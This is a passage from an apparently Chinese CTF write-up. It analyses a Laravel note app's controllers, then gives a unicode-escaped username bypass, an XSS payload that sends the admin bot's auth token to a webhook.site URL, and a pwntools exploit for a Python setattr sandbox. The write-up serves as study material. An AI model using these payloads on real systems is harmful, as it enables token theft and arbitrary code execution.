class="variable">$user</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Unauthenticated.&#x27;</span>], <span class="number">401</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sanitize username</span></span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$user</span>-&gt;username); <span class="comment">// Ensure no path traversal in username</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine disk and path based on admin status</span></span><br><span class="line">        <span class="variable">$disk</span> = <span class="string">&#x27;local&#x27;</span>;</span><br><span class="line">        <span class="variable">$basePath</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable">$publicUrl</span> = <span class="literal">null</span>; <span class="comment">// To store the public URL if applicable</span></span><br><span class="line">        <span class="comment">// Assuming &#x27;is_admin&#x27; property exists on the User model</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$user</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$disk</span> = <span class="string">&#x27;local&#x27;</span>; <span class="comment">// Corrected disk for admin</span></span><br><span class="line">            <span class="variable">$basePath</span> = <span class="string">&#x27;admin/&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="variable">$disk</span>)-&gt;<span class="title function_ invoke__">exists</span>(<span class="variable">$basePath</span>)) &#123;</span><br><span class="line">            <span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="variable">$disk</span>)-&gt;<span class="title function_ invoke__">makeDirectory</span>(<span class="variable">$basePath</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$filePath</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="string">&#x27;file&#x27;</span>)-&gt;<span class="title function_ invoke__">store</span>(<span class="variable">$basePath</span>); <span class="comment">// Corrected storeAs parameter</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$user</span>-&gt;is_admin) &amp;&amp; <span class="variable">$user</span>-&gt;is_admin) &#123; <span class="comment">// Corrected publicUrl logic</span></span><br><span class="line">            <span class="variable">$publicUrl</span> = <span class="string">&quot;/api/announcement/&quot;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filePath</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span> =&gt; <span class="title function_ invoke__">basename</span>(<span class="variable">$filePath</span>),</span><br><span class="line">            <span class="string">&#x27;disk&#x27;</span> =&gt; <span class="variable">$disk</span>,</span><br><span class="line">            <span class="string">&#x27;public_url&#x27;</span> =&gt; <span class="variable">$publicUrl</span> // Will be <span class="literal">null</span> <span class="keyword">if</span> not <span class="keyword">public</span></span><br><span class="line">        ], <span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAllFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title class_">Auth</span>::<span class="title function_ invoke__">user</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sanitize username</span></span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$user</span>-&gt;username); <span class="comment">// Ensure no path traversal in username</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$basePath</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$user</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$basePath</span> = <span class="string">&#x27;admin/&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$files</span> = <span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="string">&#x27;local&#x27;</span>)-&gt;<span class="title function_ invoke__">files</span>(<span class="variable">$basePath</span>);</span><br><span class="line">        <span class="variable">$fileContents</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable">$fileContents</span>[] = [</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span> =&gt; <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>),</span><br><span class="line">                <span class="string">&#x27;content&#x27;</span> =&gt; <span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="string">&#x27;local&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$file</span>)</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>(<span class="variable">$fileContents</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params"><span class="variable">$filename</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title class_">Auth</span>::<span class="title function_ invoke__">user</span>();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$user</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Unauthenticated.&#x27;</span>], <span class="number">401</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sanitize username</span></span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$user</span>-&gt;username); <span class="comment">// Ensure no path traversal in username</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sanitize filename</span></span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>); <span class="comment">// Extract actual filename</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$filePath</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$filename</span>; <span class="comment">// Always from private storage for download API</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="string">&#x27;local&#x27;</span>)-&gt;<span class="title function_ invoke__">exists</span>(<span class="variable">$filePath</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;File not found.&#x27;</span>], <span class="number">404</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="string">&#x27;local&#x27;</span>)-&gt;<span class="title function_ invoke__">download</span>(<span class="variable">$filePath</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">servePublicAdminFile</span>(<span class="params"><span class="variable">$filename</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>); <span class="comment">// Extract actual filename</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$filePath</span> = <span class="string">&#x27;admin/&#x27;</span>  . <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="string">&#x27;local&#x27;</span>)-&gt;<span class="title function_ invoke__">exists</span>(<span class="variable">$filePath</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;File not found.&#x27;</span>], <span class="number">404</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="string">&#x27;local&#x27;</span>)-&gt;<span class="title function_ invoke__">response</span>(<span class="variable">$filePath</span>); <span class="comment">// Changed to response()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serveAllPublicAdminFile</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$basePath</span> = <span class="string">&#x27;admin/&#x27;</span>;</span><br><span class="line">        <span class="variable">$files</span> = <span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="string">&#x27;local&#x27;</span>)-&gt;<span class="title function_ invoke__">files</span>(<span class="variable">$basePath</span>);</span><br><span class="line">        <span class="variable">$fileContents</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable">$fileContents</span>[] = [</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span> =&gt; <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>),</span><br><span class="line">                <span class="string">&#x27;content&#x27;</span> =&gt; <span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="string">&#x27;local&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$file</span>)</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>(<span class="variable">$fileContents</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>登录之后可以调用里面的一些方法</p>
<p><strong>1.upload</strong></p>
<p>上传文件并储存<br>存储路径的生成逻辑如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$user</span>-&gt;username); <span class="comment">//用 basename 去除任何路径部分，防止用户名中含有 ../ 之类的路径遍历片段。</span></span><br><span class="line"><span class="variable">$disk</span> = <span class="string">&#x27;local&#x27;</span>;</span><br><span class="line"><span class="variable">$basePath</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$username</span>;</span><br><span class="line"><span class="variable">$publicUrl</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$disk</span> = <span class="string">&#x27;local&#x27;</span>;</span><br><span class="line">    <span class="variable">$basePath</span> = <span class="string">&#x27;admin/&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果 is_admin 为真，则拼出一个针对公告接口的访问路径。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$user</span>-&gt;is_admin) &amp;&amp; <span class="variable">$user</span>-&gt;is_admin) &#123;</span><br><span class="line">    <span class="variable">$publicUrl</span> = <span class="string">&quot;/api/announcement/&quot;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filePath</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.getAllFiles</strong></p>
<p>根据当前用户（或 admin）确定要列举的目录，列举并读取所有文件</p>
<p><strong>3.download</strong></p>
<p>认证校验 → 路径净化 → 存在性检查 → 返回下载响应</p>
<p><strong>4.servePublicAdminFile</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">servePublicAdminFile</span>(<span class="params"><span class="variable">$filename</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$filePath</span> = <span class="string">&#x27;admin/&#x27;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="string">&#x27;local&#x27;</span>)-&gt;<span class="title function_ invoke__">exists</span>(<span class="variable">$filePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;File not found.&#x27;</span>], <span class="number">404</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="string">&#x27;local&#x27;</span>)-&gt;<span class="title function_ invoke__">response</span>(<span class="variable">$filePath</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>无需认证，仅针对 admin&#x2F; 目录提供公开访问<br><code>response()</code> 会以内联方式（Content-Disposition: inline）把文件流返回，适合浏览器直接预览</p>
<p><strong>5.serveAllPublicAdminFile</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serveAllPublicAdminFile</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$basePath</span> = <span class="string">&#x27;admin/&#x27;</span>;</span><br><span class="line">    <span class="variable">$files</span> = <span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="string">&#x27;local&#x27;</span>)-&gt;<span class="title function_ invoke__">files</span>(<span class="variable">$basePath</span>);</span><br><span class="line">    <span class="variable">$fileContents</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$fileContents</span>[] = [</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>    =&gt; <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>),</span><br><span class="line">            <span class="string">&#x27;content&#x27;</span> =&gt; <span class="title class_">Storage</span>::<span class="title function_ invoke__">disk</span>(<span class="string">&#x27;local&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$file</span>),</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>(<span class="variable">$fileContents</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>列举并返回 admin&#x2F; 目录下所有文件的名称与内容，同 getAllFiles，但无需认证。</p>
<p>最后还有一个关键代码</p>
<p>AdminController.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Auth</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testFile</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title class_">Auth</span>::<span class="title function_ invoke__">user</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$user</span>-&gt;username !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>( [<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Unauthenticated.&#x27;</span>], <span class="number">401</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&quot;file&quot;</span>));</span><br><span class="line">        <span class="variable">$dst</span> = <span class="title function_ invoke__">uniqid</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\$;\n\r`\.&amp;|&lt;&gt;#\&#x27;&quot;()*?:]|flag/&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([<span class="string">&#x27;error&#x27;</span>=&gt;<span class="string">&quot;Be a nice hacker&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;../storage/app/private/admin/&quot;</span> . <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([<span class="string">&#x27;error&#x27;</span>=&gt;<span class="string">&quot;<span class="subst">$file</span> not exist&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&quot;cp <span class="subst">$file</span> <span class="subst">$dst</span>&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([<span class="string">&#x27;output&#x27;</span> =&gt; <span class="string">&quot;/<span class="subst">$dst</span>&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">report</span>(<span class="params">Request <span class="variable">$request</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title class_">Auth</span>::<span class="title function_ invoke__">user</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$user</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>( [<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;lonely?&#x27;</span>], <span class="number">400</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;node ../visitor.js &quot;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>, <span class="string">&quot;cmd&quot;</span>=&gt;<span class="variable">$cmd</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>testFile</strong></p>
<p>仅允许用户名精确为 ‘admin’ 的用户执行后续操作<br>将私有文件拷贝到根目录下<br>这里的 <code>exec()</code> 存在命令注入</p>
<p><strong>report</strong></p>
<p>admin不可调用<br>执行以下命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&quot;url&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;node ../visitor.js &quot;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>

<p>我们可以发现想要走到 <code>testFile</code> 里的 <code>exec()</code>，首先需要成为admin</p>
<p>由于黑名单的限制无法直接注册admin，但是注意到AuthController里是以json格式return的，这里可以采用json unicode编码来绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg_res = requests.post(<span class="string">f&quot;<span class="subst">&#123;host&#125;</span>/api/register&quot;</span>, headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;,data=<span class="string">&#x27;&#123;&quot;username&quot;:&quot;\\u002e\\u002e\\\\\\u0061\\u0064\\u006d\\u0069\\u006e&quot;,&quot;password&quot;:&quot;123456&quot;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>在以上payload中，最终成功注册了一个<code>..\\admin</code>用户</p>
<p>根据出题人的说法<code>flysystem, the filesystem of laravel,  replace \ with / for u, and basename consider \ as a part of filename. So just register username ..\admin write to admin</code>，这里会自动把<code>\</code>替换成<code>/</code>，并且在经过basename函数时<code>..//</code>会被去除，因此就只剩下admin，如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;..//admin&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$name</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">output: admin</span><br></pre></td></tr></table></figure>

<p>这里要注意下面的写法是错的，会导致注册了一个<code>..\\u0061dmin</code>用户，这是因为第一个\将第二个\转义，无法按照unicode解析</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg_res = requests.post(<span class="string">f&quot;<span class="subst">&#123;host&#125;</span>/api/register&quot;</span>, headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;,data=<span class="string">&#x27;&#123;&quot;username&quot;:&quot;\\u002e\\u002e\\\\u0061\\u0064\\u006d\\u0069\\u006e&quot;,&quot;password&quot;:&quot;123456&quot;&#125;&#x27;</span>)</span><br><span class="line">token1 = reg_res.json()[<span class="string">&quot;token&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>注意，虽然<code>..\\admin</code>经过basename函数后会变为admin，但是在AdminController里对username的校验并没有经过basename函数，因此我们需要在<code>..\\admin</code>获取到一个真正admin的token，才能去调用我们想要的testfile方法，对于一个note网站，很容易想到XSS</p>
<p>注意到源码中还有一个visitor.js，在AdminController的report方法里被调用，这里其实就相当于一个adminbot，我们让bot去访问上传的带有XSS payload的网页即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xsscontent = <span class="string">&#x27;&#x27;&#x27;&lt;script&gt;fetch(`https://webhook.site/e3e89089-a107-4b70-8a6a-f56bcf70bdd8?token=$&#123;encodeURIComponent(localStorage.auth_token)&#125;`)&lt;/script&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">upload_res = r.post(<span class="string">f&quot;<span class="subst">&#123;host&#125;</span>/api/upload&quot;</span>, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;note.txt&quot;</span>, xsscontent)&#125;, headers=&#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;Bearer <span class="subst">&#123;token1&#125;</span>&quot;</span>&#125;,)</span><br><span class="line">path = upload_res.json()[<span class="string">&quot;path&quot;</span>]</span><br><span class="line"></span><br><span class="line">url = <span class="string">f&quot;<span class="subst">&#123;host&#125;</span>/api/announcement/<span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">res = r.post(<span class="string">f&quot;<span class="subst">&#123;host&#125;</span>/api/admin/report&quot;</span>, json=&#123;<span class="string">&quot;url&quot;</span>: url&#125;, headers=&#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;Bearer <span class="subst">&#123;token1&#125;</span>&quot;</span>&#125;,)</span><br></pre></td></tr></table></figure>

<p>服了，一直等不到admin token，后面越看越晕，这题复盘暂时中止</p>
<h2 id="simp"><a href="#simp" class="headerlink" title="simp"></a>simp</h2><p>很短的源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    mod, attr, value = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">setattr</span>(<span class="built_in">__import__</span>(mod), attr, value)</span><br></pre></td></tr></table></figure>

<p>程序进入一个无限循环，每次都会读取一行用户输入，分别赋值给mod，attr，value</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">48763</span>)</span><br><span class="line">conn.sendline(<span class="string">b&#x27;dataclasses _FIELDS x\rbreakpoint()\rdef\tf():#&#x27;</span>)</span><br><span class="line">conn.sendline(<span class="string">b&#x27;dataclasses _POST_INIT_NAME x\rbreakpoint()\rdef\tf():#&#x27;</span>)</span><br><span class="line">conn.sendline(<span class="string">b&#x27;pstats x x&#x27;</span>)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>

<p>然后就可以执行任意python代码</p>
